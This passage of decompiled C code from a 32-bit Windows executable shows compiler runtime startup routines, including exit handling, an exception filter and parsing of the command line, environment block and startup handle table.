        g48++;
        *(int32_t *)(a4 + 12) = v11;
        *(int32_t *)(a4 + 4) = 0;
        *(int32_t *)a4 = 0;
        *(int32_t *)(a4 + 8) = 0;
        *(int32_t *)(a4 + 28) = 0;
        *(int32_t *)(a4 + 16) = v22;
        result = a4;
    }
    // 0x402950
    return result;
}

// Address range: 0x402955 - 0x4029cd
int32_t function_402955(void) {
    // 0x402955
    if (g105 < 1) {
        // 0x4029c6
        return 0;
    }
    int32_t v1 = g103; // 0x40296f
    int32_t v2 = 0;
    int32_t v3 = *(int32_t *)v1; // 0x402971
    int32_t result; // 0x402955
    int32_t v4; // 0x402987
    while (v3 != 0) {
        // 0x402977
        if ((*(char *)(v3 + 12) & -125) == 0) {
            // 0x4029b0
            v4 = *(int32_t *)(4 * v2 + g103);
            result = 0;
            if (v4 == 0) {
                return result;
            } else {
                goto lab_0x4029b4;
            }
        }
        int32_t v5 = v2 + 1; // 0x40297d
        v1 += 4;
        if (v5 >= g105) {
            // 0x4029c6
            return 0;
        }
        v2 = v5;
        v3 = *(int32_t *)v1;
    }
    int32_t v6 = 4 * v2; // 0x402990
    *(int32_t *)(g103 + v6) = (int32_t)_malloc(32);
    int32_t v7 = *(int32_t *)(g103 + v6); // 0x4029a7
    v4 = v7;
    if (v7 == 0) {
        // 0x4029c6
        return 0;
    }
    goto lab_0x4029b4;
  lab_0x4029b4:
    // 0x4029b4
    *(int32_t *)(v4 + 16) = -1;
    *(int32_t *)(v4 + 4) = 0;
    *(int32_t *)(v4 + 12) = 0;
    *(int32_t *)(v4 + 8) = 0;
    *(int32_t *)v4 = 0;
    *(int32_t *)(v4 + 28) = 0;
    result = v4;
  lab_0x4029c6:
    // 0x4029c6
    return result;
}

// Address range: 0x4029cd - 0x4029fa
int32_t function_4029cd(void) {
    // 0x4029cd
    function_402ab5(&g6, &g7);
    return function_402ab5(&g4, &g5);
}

// Address range: 0x4029fa - 0x402a0b
int32_t function_4029fa(int32_t a1) {
    // 0x4029fa
    return function_402a1c(a1, 0, 0);
}

// Address range: 0x402a0b - 0x402a1c
int32_t function_402a0b(int32_t a1) {
    // 0x402a0b
    return function_402a1c(a1, 1, 0);
}

// Address range: 0x402a1c - 0x402ab5
int32_t function_402a1c(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402a1c
    int32_t v1; // bp-4, 0x402a1c
    int32_t * v2 = &v1; // 0x402a26
    if (g63 == 1) {
        int32_t * processHandle = GetCurrentProcess(); // 0x402a2c
        int32_t v3 = (int32_t)processHandle; // bp-12, 0x402a32
        TerminateProcess(processHandle, (int32_t)&g110);
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t v5 = *(int32_t *)(v4 + 16); // 0x402a3f
    g62 = 1;
    g61 = v5;
    int32_t * v6; // 0x402a1c
    int32_t * v7; // 0x402a1c
    if (*(int32_t *)(v4 + 12) != 0) {
        // 0x402a39
        v7 = (int32_t *)(v4 - 12);
        v6 = (int32_t *)(v4 - 8);
    } else {
        // 0x402a51
        int32_t * v8; // 0x402a1c
        if (g102 == 0) {
            // 0x402a51
            v8 = (int32_t *)(v4 - 8);
        } else {
            int32_t * v9 = (int32_t *)(v4 - 8);
            int32_t v10 = g101 - 4; // 0x402a61
            v8 = v9;
            if (v10 >= g102) {
                int32_t v11 = v10; // 0x402a70
                v11 -= 4;
                v8 = v9;
                while (v11 >= g102) {
                    // 0x402a68
                    v11 -= 4;
                    v8 = v9;
                }
            }
        }
        // 0x402a7c
        *v8 = (int32_t)&g9;
        int32_t * v12 = (int32_t *)(v4 - 12);
        *v12 = (int32_t)&g8;
        function_402ab5(&g110, &g110);
        v7 = v12;
        v6 = v8;
    }
    // 0x402a8d
    *v6 = (int32_t)&g11;
    *v7 = (int32_t)&g10;
    int32_t result = function_402ab5(&g110, &g110); // 0x402a97
    if (v5 != 0) {
        // 0x402ab3
        return result;
    }
    // 0x402aa3
    *(int32_t *)(v4 - 4) = *(int32_t *)(v4 + 8);
    g63 = 1;
    ExitProcess((int32_t)&g110);
    // UNREACHABLE
}

// Address range: 0x402ab5 - 0x402acf
int32_t function_402ab5(int32_t * a1, int32_t * a2) {
    if (a1 >= a2) {
        // 0x402acd
        int32_t result; // 0x402ab5
        return result;
    }
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1 + 4; // 0x402ac8
    while (v2 < (uint32_t)(int32_t)a2) {
        // 0x402ac0
        v1 = v2;
        v2 = v1 + 4;
    }
    // 0x402acd
    return *(int32_t *)v1;
}

// Address range: 0x402acf - 0x402c10
int32_t function_402acf(int32_t a1, int32_t ExceptionInfo) {
    // 0x402acf
    int32_t v1; // 0x402acf
    int32_t v2; // 0x402acf
    int32_t v3 = function_402c10(a1, v2, v1); // 0x402ad6
    if (v3 == 0) {
        // 0x402c0d
        return UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo);
    }
    int32_t * v4 = (int32_t *)(v3 + 8); // 0x402ae4
    int32_t v5 = *v4; // 0x402ae4
    if (v5 == 0) {
        // 0x402c0d
        return UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo);
    }
    if (v5 == 5) {
        // 0x402af4
        *v4 = 0;
        // 0x402c0d
        return 1;
    }
    // 0x402b00
    if (v5 == 1) {
        // 0x402c0d
        return -1;
    }
    int32_t v6 = g64; // 0x402b09
    g64 = ExceptionInfo;
    if (*(int32_t *)(v3 + 4) != 8) {
        // 0x402bef
        *v4 = 0;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    int32_t v7 = g23; // 0x402b27
    if (g24 + v7 > v7) {
        int32_t v8 = g24; // 0x402b3f
        int32_t v9 = 12 * v7 + (int32_t)&g22; // 0x402b3f
        *(int32_t *)v9 = 0;
        v8--;
        v9 += 12;
        while (v8 != 0) {
            // 0x402b46
            *(int32_t *)v9 = 0;
            v8--;
            v9 += 12;
        }
    }
    int32_t v10 = *(int32_t *)v3; // 0x402b4f
    int32_t v11 = g26; // 0x402b51
    if (v10 == -0x3fffff72) {
        // 0x402b5e
        g26 = 131;
        // 0x402bda
        g26 = v11;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    if (v10 == -0x3fffff70) {
        // 0x402b71
        g26 = 129;
        // 0x402bda
        g26 = v11;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    if (v10 == -0x3fffff6f) {
        // 0x402b84
        g26 = 132;
        // 0x402bda
        g26 = v11;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    if (v10 == -0x3fffff6d) {
        // 0x402b97
        g26 = 133;
        // 0x402bda
        g26 = v11;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    if (v10 == -0x3fffff73) {
        // 0x402baa
        g26 = 130;
        // 0x402bda
        g26 = v11;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    if (v10 == -0x3fffff71) {
        // 0x402bbd
        g26 = 134;
        // 0x402bda
        g26 = v11;
        // 0x402bf7
        g64 = v6;
        // 0x402c0d
        return -1;
    }
    if (v10 == -0x3fffff6e) {
        // 0x402bd0
        g26 = 138;
    }
    // 0x402bda
    g26 = v11;
    // 0x402bf7
    g64 = v6;
    // 0x402c0d
    return -1;
}

// Address range: 0x402c10 - 0x402c53
int32_t function_402c10(int32_t a1, int32_t a2, int32_t a3) {
    uint32_t v1 = 12 * g25 + (int32_t)&g21;
    int32_t v2 = &g21; // 0x402c26
    int32_t result = &g21; // 0x402c26
    if (g21 != a1) {
        v2 += 12;
        result = v2;
        while (v2 < v1) {
            // 0x402c39
            result = v2;
            if (*(int32_t *)v2 == a1) {
                // break -> 0x402c3d
                break;
            }
            v2 += 12;
            result = v2;
        }
    }
    // 0x402c3d
    if (result < v1) {
        // 0x402c4c
        if (*(int32_t *)result == a1) {
            // 0x402c52
            return result;
        }
    }
    // 0x402c52
    return 0;
}

// Address range: 0x402c53 - 0x402d0c
int32_t function_402c53(void) {
    // 0x402c53
    if (g100 == 0) {
        // 0x402c60
        int32_t v1; // 0x402c53
        int32_t v2; // 0x402c53
        int32_t v3; // 0x402c53
        function_405464(v1, v2, v3);
    }
    // 0x402c65
    int32_t v4; // bp-12, 0x402c53
    int32_t v5 = &v4; // 0x402c5d
    int32_t * v6 = (int32_t *)(v5 - 4);
    int32_t v7 = (int32_t)g45; // 0x402c6b
    int32_t v8 = 0; // 0x402c6b
    int32_t v9; // 0x402c53
    while (true) {
      lab_0x402c6d:
        // 0x402c6d
        v9 = v8;
        v8 = v9;
        int32_t v10; // 0x402c53
        switch (*(char *)v10) {
            case 0: {
                goto lab_0x402c85;
            }
            case 61: {
                goto lab_0x402c78;
            }
            default: {
                // 0x402c77
                v8 = v9 + 1;
                goto lab_0x402c78;
            }
        }
    }
  lab_0x402c85:
    // 0x402c85
    *v6 = 4 * v9 + 4;
    int32_t * v11 = _malloc((int32_t)&g110); // 0x402c8d
    int32_t v12 = (int32_t)v11; // 0x402c8d
    g58 = v12;
    if (v11 == NULL) {
        // 0x402c9f
        *v6 = 9;
        __amsg_exit();
    }
    char * v13 = g45; // 0x402ca7
    char * v14 = v13; // 0x402caf
    int32_t * v15 = v11; // 0x402caf
    if (*v13 != 0) {
        int32_t * v16 = (int32_t *)(v5 - 8); // 0x402cb2
        int32_t v17 = (int32_t)v13;
        *v16 = v17;
        int32_t v18 = function_403840((int32_t)&g110) + 1; // 0x402cbb
        int32_t v19 = v12; // 0x402cbf
        int32_t * v20; // 0x402cc2
        int32_t * v21; // 0x402cca
        if (*(char *)v17 != 61) {
            // 0x402cc1
            *v16 = v18;
            v20 = _malloc((int32_t)&g110);
            v21 = (int32_t *)v12;
            *v21 = (int32_t)v20;
            if (v20 == NULL) {
                // 0x402cce
                *v16 = 9;
                __amsg_exit();
            }
            // 0x402cd6
            *v16 = v17;
            *(int32_t *)(v5 - 12) = *v21;
            function_404fb0((int32_t)&g110);
            v19 = v12 + 4;
        }
        int32_t v22 = v19;
        int32_t v23 = v18 + v17; // 0x402ce3
        while (*(char *)v23 != 0) {
            // 0x402cb2
            v17 = v23;
            int32_t v24 = v22;
            *v16 = v17;
            v18 = function_403840((int32_t)&g110) + 1;
            v19 = v24;
            if (*(char *)v17 != 61) {
                // 0x402cc1
                *v16 = v18;
                v20 = _malloc((int32_t)&g110);
                v21 = (int32_t *)v24;
                *v21 = (int32_t)v20;
                if (v20 == NULL) {
                    // 0x402cce
                    *v16 = 9;
                    __amsg_exit();
                }
                // 0x402cd6
                *v16 = v17;
                *(int32_t *)(v5 - 12) = *v21;
                function_404fb0((int32_t)&g110);
                v19 = v24 + 4;
            }
            // 0x402ce3
            v22 = v19;
            v23 = v18 + v17;
        }
        // 0x402ce9
        v14 = g45;
        v15 = (int32_t *)v22;
    }
    // 0x402cea
    *v6 = (int32_t)v14;
    int32_t result = function_401f99((int32_t)&g110); // 0x402cf0
    g45 = NULL;
    *v15 = 0;
    g99 = 1;
    return result;
  lab_0x402c78:
    // 0x402c78
    *v6 = v7;
    v7 = v7 + 1 + function_403840((int32_t)&g110);
    goto lab_0x402c6d;
}

// Address range: 0x402d0c - 0x402da5
int32_t function_402d0c(void) {
    // 0x402d0c
    if (g100 == 0) {
        // 0x402d1e
        int32_t v1; // 0x402d0c
        int32_t v2; // 0x402d0c
        int32_t v3; // 0x402d0c
        function_405464(v1, v2, v3);
    }
    // 0x402d23
    GetModuleFileNameA(NULL, (char *)&g65, 260);
    char * v4 = g106; // 0x402d35
    g60 = (char *)&g65;
    int32_t v5 = *v4 == 0 ? (int32_t)&g65 : (int32_t)v4;
    int32_t v6; // bp-12, 0x402d0c
    int32_t v7; // bp-8, 0x402d0c
    function_402da5(v5, 0, 0, &v7, &v6);
    int32_t * v8 = _malloc(4 * v7 + v6); // 0x402d62
    if (v8 == NULL) {
        // 0x402d70
        __amsg_exit();
    }
    int32_t v9 = (int32_t)v8; // 0x402d62
    function_402da5(v5, v9, 4 * v7 + v9, &v7, &v6);
    int32_t result = v7 - 1; // 0x402d94
    g57 = v9;
    g56 = result;
    return result;
}

// Address range: 0x402da5 - 0x402f59
int32_t function_402da5(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5) {
    // 0x402da5
    *a5 = 0;
    *a4 = 1;
    int32_t v1 = 0; // 0x402dc5
    if (a2 != 0) {
        // 0x402dc7
        *(int32_t *)a2 = a3;
        v1 = a2 + 4;
    }
    int32_t v2 = a1; // 0x402dd2
    int32_t v3 = a3; // 0x402dd2
    int32_t v4 = a1; // 0x402dd2
    int32_t v5 = a3; // 0x402dd2
    int32_t v6; // 0x402da5
    int32_t v7; // 0x402da5
    int32_t v8; // 0x402da5
    int32_t v9; // 0x402da5
    int32_t v10; // 0x402da5
    int32_t v11; // 0x402da5
    if (*(char *)a1 != 34) {
        while (true) {
          lab_0x402e18:;
            int32_t v12 = v5;
            int32_t v13 = v4;
            *a5 = *a5 + 1;
            char * v14 = (char *)v13;
            int32_t v15 = 0; // 0x402e1c
            if (v12 != 0) {
                // 0x402e1e
                *(char *)v12 = *v14;
                v15 = v12 + 1;
            }
            int32_t v16 = v15;
            unsigned char v17 = *v14; // 0x402e23
            int32_t v18 = v13 + 1; // 0x402e25
            int32_t v19 = v18; // 0x402e30
            int32_t v20 = v16; // 0x402e30
            if ((*(char *)((int32_t)v17 + (int32_t)&g85) & 4) != 0) {
                // 0x402e32
                *a5 = *a5 + 1;
                int32_t v21 = 0; // 0x402e36
                if (v16 != 0) {
                    // 0x402e38
                    *(char *)v16 = *(char *)v18;
                    v21 = v16 + 1;
                }
                // 0x402e3d
                v19 = v13 + 2;
                v20 = v21;
            }
            // 0x402e3e
            v5 = v20;
            v4 = v19;
            switch (v17) {
                case 32: {
                    goto lab_0x402e53;
                }
                case 0: {
                    // 0x402e50
                    v8 = v4 - 1;
                    v11 = v5;
                    goto lab_0x402e5b;
                }
                default: {
                    // 0x402e47
                    if (v17 == 9) {
                        // break -> 0x402e53
                        break;
                    }
                    goto lab_0x402e18;
                }
            }
        }
      lab_0x402e53:
        // 0x402e53
        v8 = v4;
        v11 = 0;
        if (v5 != 0) {
            // 0x402e57
            *(char *)(v5 - 1) = 0;
            v8 = v4;
            v11 = v5;
        }
    } else {
        int32_t v22; // 0x402da5
        int32_t v23; // 0x402da5
        int32_t v24; // 0x402dd4
        char * v25; // 0x402da5
        while (true) {
          lab_0x402dd4_2:
            // 0x402dd4
            v23 = v3;
            v22 = v2;
            v24 = v22 + 1;
            v25 = (char *)v24;
            unsigned char v26 = *v25; // 0x402dd4
            switch (v26) {
                case 34: {
                    goto lab_0x402e06;
                }
                case 0: {
                    goto lab_0x402e06;
                }
                default: {
                    char v27 = *(char *)((int32_t)v26 + (int32_t)&g85); // 0x402de4
                    v7 = v24;
                    v10 = v23;
                    if ((v27 & 4) == 0) {
                        goto lab_0x402df9;
                    } else {
                        int32_t v28 = *a5; // 0x402ded
                        *a5 = v28 + 1;
                        if (v23 == 0) {
                            // 0x402df9
                            *a5 = v28 + 2;
                            v6 = v24;
                            v9 = 0;
                            goto lab_0x402dd4;
                        } else {
                            // 0x402df3
                            *(char *)v23 = *v25;
                            v7 = v22 + 2;
                            v10 = v23 + 1;
                            goto lab_0x402df9;
                        }
                    }
                }
            }
        }
      lab_0x402e06:
        // 0x402e06
        *a5 = *a5 + 1;
        int32_t v29 = 0; // 0x402e0a
        if (v23 != 0) {
            // 0x402e0c
            *(char *)v23 = 0;
            v29 = v23 + 1;
        }
        // 0x402e10
        v8 = *v25 != 34 ? v24 : v22 + 2;
        v11 = v29;
    }
    goto lab_0x402e5b;
  lab_0x402ed4:;
    // 0x402ed4
    int32_t v67; // 0x402da5
    int32_t v79 = v67;
    int32_t v65; // 0x402da5
    int32_t v80 = v65;
    int32_t v64; // 0x402da5
    int32_t v82 = v64;
    int32_t v63; // 0x402da5
    int32_t v81 = v63;
    int32_t v66; // 0x402da5
    int32_t v83 = v66; // 0x402ed9
    int32_t v50; // 0x402da5
    int32_t v84 = v50; // 0x402ed9
    int32_t v85 = v50; // 0x402ed9
    if (v66 != 0) {
        int32_t v86 = v84;
        int32_t v87 = 0; // 0x402ede
        if (v86 != 0) {
            // 0x402ee0
            *(char *)v86 = 92;
            v87 = v86 + 1;
        }
        // 0x402ee4
        *a5 = *a5 + 1;
        int32_t v88 = v83 - 1; // 0x402ee6
        v83 = v88;
        v85 = v87;
        while (v88 != 0) {
            // 0x402edc
            v86 = v87;
            v87 = 0;
            if (v86 != 0) {
                // 0x402ee0
                *(char *)v86 = 92;
                v87 = v86 + 1;
            }
            // 0x402ee4
            *a5 = *a5 + 1;
            v88 = v83 - 1;
            v83 = v88;
            v85 = v87;
        }
    }
    int32_t v76 = v85;
    char * v78 = (char *)v80;
    unsigned char v89 = *v78; // 0x402ee9
    if (v89 == 0) {
        // break -> 0x402f39
        goto lab_0x402f39_2;
    }
    if (v81 != 0) {
        goto lab_0x402eff;
    } else {
        switch (v89) {
            case 32: {
                goto lab_0x402f39_2;
            }
            case 9: {
                goto lab_0x402f39_2;
            }
            default: {
                goto lab_0x402eff;
            }
        }
    }
  lab_0x402eff:;
    int32_t v90 = v80; // 0x402f03
    int32_t v91 = v76; // 0x402f03
    if (v82 != 0) {
        char v92 = *(char *)((int32_t)v89 + (int32_t)&g85);
        int32_t v93; // 0x402da5
        int32_t v94; // 0x402da5
        if (v76 == 0) {
            // 0x402f22
            v93 = v80;
            v94 = 0;
            if ((v92 & 4) != 0) {
                // 0x402f2e
                *a5 = *a5 + 1;
                v93 = v80 + 1;
                v94 = 0;
            }
        } else {
            char v95 = v89; // 0x402f13
            int32_t v96 = v80; // 0x402f13
            int32_t v97 = v76; // 0x402f13
            if ((v92 & 4) != 0) {
                // 0x402f15
                *(char *)v76 = v89;
                v96 = v80 + 1;
                *a5 = *a5 + 1;
                v95 = *(char *)v96;
                v97 = v76 + 1;
            }
            // 0x402f1b
            *(char *)v97 = v95;
            v93 = v96;
            v94 = v97 + 1;
        }
        // 0x402f31
        *a5 = *a5 + 1;
        v90 = v93;
        v91 = v94;
    }
    int32_t v45 = v81; // 0x402f34
    int32_t v46 = v90 + 1; // 0x402f34
    int32_t v47 = v91; // 0x402f34
    int32_t v48 = v79; // 0x402f34
    goto lab_0x402e91;
  lab_0x402ed2:;
    // 0x402ed2
    int32_t v68; // 0x402da5
    v63 = v68;
    int32_t v69; // 0x402da5
    v64 = v69;
    int32_t v70; // 0x402da5
    v65 = v70;
    int32_t v61; // 0x402da5
    v66 = v61 / 2;
    int32_t v71; // 0x402da5
    v67 = v71;
    goto lab_0x402ed4;
  lab_0x402ec4:;
    // 0x402ec4
    int32_t v51; // 0x402da5
    v68 = v51 == 0;
    int32_t v72; // 0x402da5
    v69 = v72;
    int32_t v73; // 0x402da5
    v70 = v73;
    int32_t v44; // 0x402da5
    v71 = v44;
    goto lab_0x402ed2;
  lab_0x402df9:;
    int32_t v98 = v10;
    int32_t v99 = v7;
    *a5 = *a5 + 1;
    v6 = v99;
    v9 = 0;
    if (v98 != 0) {
        // 0x402dff
        *(char *)v98 = *(char *)v99;
        v6 = v99;
        v9 = v98 + 1;
    }
    goto lab_0x402dd4;
  lab_0x402dd4:
    // 0x402dd4
    v2 = v6;
    v3 = v9;
    goto lab_0x402dd4_2;
  lab_0x402e5b:;
    char v30 = *(char *)v8; // 0x402e5f
    char v31 = v30; // 0x402e62
    int32_t v32 = v1; // 0x402e62
    int32_t v33 = v11; // 0x402e62
    int32_t v34 = v8; // 0x402e62
    int32_t v35 = 0; // 0x402e62
    int32_t v36 = v1; // 0x402e62
    if (v30 != 0) {
        while (true) {
            int32_t v37 = v33;
            int32_t v38 = v32;
            char v39 = v31; // 0x402e68
            int32_t v40 = v34; // 0x402e6d
            if (v39 != 32 != v39 != 9) {
                int32_t v41 = v40 + 1; // 0x402e74
                char v42 = *(char *)v41; // 0x402e68
                v40 = v41;
                while (v42 != 32 != v42 != 9) {
                    // 0x402e74
                    v41 = v40 + 1;
                    v42 = *(char *)v41;
                    v40 = v41;
                }
                // 0x402e77
                v36 = v38;
                if (v42 == 0) {
                    // break -> 0x402f48
                    break;
                }
            }
            int32_t v43 = 0; // 0x402e82
            if (v38 != 0) {
                // 0x402e84
                *(int32_t *)v38 = v37;
                v43 = v38 + 4;
            }
            // 0x402e8c
            v44 = v43;
            *a4 = *a4 + 1;
            v45 = v35;
            v46 = v34;
            v47 = v37;
            v48 = v43;
            while (true) {
              lab_0x402e91:;
                int32_t v49 = v48;
                v50 = v47;
                v51 = v45;
                char v52 = *(char *)v46; // 0x402e9a
                int32_t v53 = v46; // 0x402e9d
                int32_t v54 = v46; // 0x402e9d
                int32_t v55 = 0; // 0x402e9d
                char v56 = v52; // 0x402e9d
                if (v52 == 92) {
                    v54 = v53 + 1;
                    v55 = 1;
                    v56 = *(char *)v54;
                    while (v56 == 92) {
                        // 0x402e9f
                        v54 = v53 + 1;
                        int32_t v57; // 0x402da5
                        v55 = v57 + 1;
                        v56 = *(char *)v54;
                        v57 = v55;
                        v53 = v54;
                        int32_t v58 = v54; // 0x402e9d
                        int32_t v59 = v55; // 0x402e9d
                        char v60 = v56; // 0x402e9d
                    }
                }
                // 0x402ea3
                v61 = v55;
                int32_t v62 = v54;
                v63 = v51;
                v64 = 1;
                v65 = v62;
                v66 = v61;
                v67 = v49;
                if (v56 != 34) {
                    goto lab_0x402ed4;
                } else {
                    // 0x402ea8
                    v68 = v51;
                    v69 = 1;
                    v70 = v62;
                    v71 = v49;
                    if ((v61 & 1) != 0) {
                        goto lab_0x402ed2;
                    } else {
                        if (v51 == 0) {
                            // 0x402ec1
                            v72 = 0;
                            v73 = v62;
                            goto lab_0x402ec4;
                        } else {
                            int32_t v74 = v62 + 1; // 0x402eb4
                            v72 = 1;
                            v73 = v74;
                            if (*(char *)v74 != 34) {
                                // 0x402ec1
                                v72 = 0;
                                v73 = v62;
                                goto lab_0x402ec4;
                            } else {
                                goto lab_0x402ec4;
                            }
                        }
                    }
                }
            }
          lab_0x402f39_2:;
            int32_t v75 = 0; // 0x402f3b
            if (v76 != 0) {
                // 0x402f3d
                *(char *)v76 = 0;
                v75 = v76 + 1;
            }
            // 0x402f41
            *a5 = *a5 + 1;
            char v77 = *v78; // 0x402e5f
            v31 = v77;
            v32 = v79;
            v33 = v75;
            v34 = v80;
            v35 = v81;
            v36 = v79;
            if (v77 == 0) {
                // break -> 0x402f48
                break;
            }
        }
    }
    // 0x402f48
    if (v36 != 0) {
        // 0x402f4c
        *(int32_t *)v36 = 0;
    }
    // 0x402f4f
    *a4 = *a4 + 1;
    return (int32_t)a4;
}

// Address range: 0x402f59 - 0x40308b
int32_t function_402f59(void) {
    int32_t v1 = g66; // 0x402f5b
    char * lpszEnvironmentBlock; // 0x402f59
    int16_t * lpWideCharStr; // 0x402f59
    if (v1 != 0) {
        if (v1 != 1) {
            // 0x403031
            if (v1 != 2) {
                // 0x403084
                return 0;
            }
            char * v2 = GetEnvironmentStrings(); // 0x40303a
            lpszEnvironmentBlock = v2;
            if (v2 == NULL) {
                // 0x403084
                return 0;
            }
            goto lab_0x403046;
        } else {
            int16_t * v3 = GetEnvironmentStringsW(); // 0x402fb4
            lpWideCharStr = v3;
            if (v3 == NULL) {
                // 0x403084
                return 0;
            }
            goto lab_0x402fc0;
        }
    } else {
        int16_t * v4 = GetEnvironmentStringsW(); // 0x402f74
        if (v4 == NULL) {
            char * v5 = GetEnvironmentStrings(); // 0x402f88
            if (v5 == NULL) {
                // 0x403084
                return 0;
            }
            // 0x403036
            g66 = 2;
            lpszEnvironmentBlock = v5;
            goto lab_0x403046;
        } else {
            // 0x402fb0
            g66 = 1;
            lpWideCharStr = v4;
            goto lab_0x402fc0;
        }
    }
  lab_0x403046:;
    int32_t v6 = (int32_t)lpszEnvironmentBlock;
    int32_t v7 = v6; // 0x40304a
    int32_t v8 = v6; // 0x40304a
    if (*lpszEnvironmentBlock != 0) {
        while (true) {
            int32_t v9 = v7;
            int32_t v10 = v9 + 1; // 0x40304c
            int32_t v11 = v10; // 0x40304f
            if (*(char *)v10 == 0) {
                // 0x403051
                v11 = v9 + 2;
                v8 = v11;
                if (*(char *)v11 == 0) {
                    // break -> 0x403056
                    break;
                }
            }
            // 0x40304c
            v7 = v11;
        }
    }
    int32_t v12 = v8 - v6 + 1; // 0x403058
    int32_t * v13 = _malloc(v12); // 0x40305c
    int32_t result = 0; // 0x403066
    if (v13 != NULL) {
        int32_t v14 = (int32_t)v13; // 0x40305c
        function_4024b0(v14, v6, v12);
        result = v14;
    }
    // 0x403077
    FreeEnvironmentStringsA(lpszEnvironmentBlock);
    // 0x403084
    return result;
  lab_0x402fc0:;
    int32_t v15 = (int32_t)lpWideCharStr;
    int32_t v16 = v15; // 0x402fc5
    int32_t v17 = v15; // 0x402fc5
    if (*lpWideCharStr != 0) {
        while (true) {
            int32_t v18 = v16;
            int32_t v19 = v18 + 2; // 0x402fc8
            int32_t v20 = v19; // 0x402fcc
            if (*(int16_t *)v19 == 0) {
                // 0x402fce
                v20 = v18 + 4;
                v17 = v20;
                if (*(int16_t *)v20 == 0) {
                    // break -> 0x402fd5
                    break;
                }
            }
            // 0x402fc7
            v16 = v20;
        }
    }
    int32_t v21 = 0; // bp-56, 0x402fe7
    int32_t v22 = &v21; // 0x402fe7
    int32_t cbMultiByte = WideCharToMultiByte(0, 0, lpWideCharStr, (v17 - v15) / 2 + 1, NULL, 0, NULL, NULL); // 0x402fec
    int32_t result2 = 0; // 0x402ff2
    int32_t v23 = v22; // 0x402ff2
    if (cbMultiByte != 0) {
        int32_t * lpMultiByteStr = _malloc(cbMultiByte); // 0x402ff5
        result2 = 0;
        v23 = v22;
        if (lpMultiByteStr != NULL) {
            int32_t v24 = 0; // bp-88, 0x40300d
            int32_t v25 = WideCharToMultiByte(0, 0, lpWideCharStr, 0, (char *)lpMultiByteStr, cbMultiByte, NULL, NULL); // 0x40300e
            char * v26 = (char *)lpMultiByteStr; // 0x403012
            if (v25 == 0) {
                // 0x403014
                function_401f99((int32_t)lpMultiByteStr);
                v26 = NULL;
            }
            // 0x403022
            result2 = (int32_t)v26;
            v23 = &v24;
        }
    }
    // 0x403026
    *(int32_t *)(v23 - 4) = v15;
    FreeEnvironmentStringsW((int16_t *)&g110);
    // 0x403084
    return result2;
}

// Address range: 0x40308b - 0x403236
int32_t function_40308b(int32_t a1) {
    struct _STARTUPINFOA * v1 = (struct _STARTUPINFOA *)256; // bp-88, 0x403092
    int32_t * v2 = _malloc(256); // 0x403097
    if (v2 == NULL) {
        // 0x4030a3
        v1 = (struct _STARTUPINFOA *)27;
        __amsg_exit();
    }
    int32_t v3 = (int32_t)v2; // 0x403097
    g96 = v3;
    g98 = false;
    int32_t v4 = v3; // 0x4030c3
    if (v2 < (int32_t *)-256) {
        *(char *)(v4 + 4) = 0;
        *(int32_t *)v4 = -1;
        *(char *)(v4 + 5) = 10;
        v4 += 8;
        while (v4 < g96 + 256) {
            // 0x4030c5
            *(char *)(v4 + 4) = 0;
            *(int32_t *)v4 = -1;
            *(char *)(v4 + 5) = 10;
            v4 += 8;
        }
    }
    // 0x4030df
    int32_t lpStartupInfo; // bp-68, 0x40308b
    v1 = (struct _STARTUPINFOA *)&lpStartupInfo;
    int32_t v5 = (int32_t)&v1; // 0x4030e3
    GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
    int32_t v6 = v5; // 0x4030f0
    int32_t v7; // 0x40308b
    int32_t v8; // 0x40308b
    int32_t v9; // 0x40308b
    int32_t v10; // 0x40308b
    int32_t v11; // 0x40308b
    uint32_t v12; // 0x40308b
    int32_t v13; // 0x40308b
    int32_t v14; // 0x40308b
    int32_t v15; // 0x40308b
    uint32_t v16; // 0x40308b
    int32_t v17; // 0x40308b
    int16_t v18; // 0x40308b
    char * v19; // 0x40317c
    if (v17 != 0 && v18 != 0) {
        int32_t v20 = *(int32_t *)v17; // 0x403102
        v16 = v20 < 2048 ? v20 : 2048;
        if (v16 > (int32_t)g98) {
            int32_t v21 = &g97; // 0x40308b
            *(int32_t *)(v5 - 4) = 256;
            int32_t * v22 = _malloc((int32_t)&g110); // 0x403127
            v6 = v5;
            while (v22 != NULL) {
                int32_t v23 = (int32_t)v22; // 0x403127
                int32_t * v24 = (int32_t *)v21; // 0x403138
                *v24 = v23;
                int32_t v25 = v23; // 0x403142
                if (v22 < (int32_t *)-256) {
                    *(char *)(v25 + 4) = 0;
                    *(int32_t *)v25 = -1;
                    *(char *)(v25 + 5) = 10;
                    int32_t v26 = v25 + 8; // 0x403151
                    v25 = v26;
                    while (v26 < *v24 + 256) {
                        // 0x403144
                        *(char *)(v25 + 4) = 0;
                        *(int32_t *)v25 = -1;
                        *(char *)(v25 + 5) = 10;
                        v26 = v25 + 8;
                        v25 = v26;
                    }
                }
                // 0x40315c
                v21 += 4;
                if (v16 <= (int32_t)g98) {
                    goto lab_0x40316f;
                }
                *(int32_t *)(v5 - 4) = 256;
                v22 = _malloc((int32_t)&g110);
                v6 = v5;
            }
        } else {
          lab_0x40316f:;
            int32_t v27 = v17 + 4; // 0x403104
            v10 = v20 + v27;
            v13 = v5;
            v8 = v27;
            v11 = 0;
            v6 = v5;
            if (v16 >= 1) {
                while (true) {
                  lab_0x403175:
                    // 0x403175
                    v12 = v11;
                    v9 = v8;
                    int32_t v28 = v13;
                    int32_t * v29 = (int32_t *)v10; // 0x403175
                    int32_t v30 = *v29; // 0x403175
                    v15 = v28;
                    if (v30 == -1) {
                        goto lab_0x4031b2;
                    } else {
                        // 0x40317c
                        v19 = (char *)v9;
                        char v31 = *v19; // 0x40317c
                        v15 = v28;
                        if ((v31 & 1) == 0) {
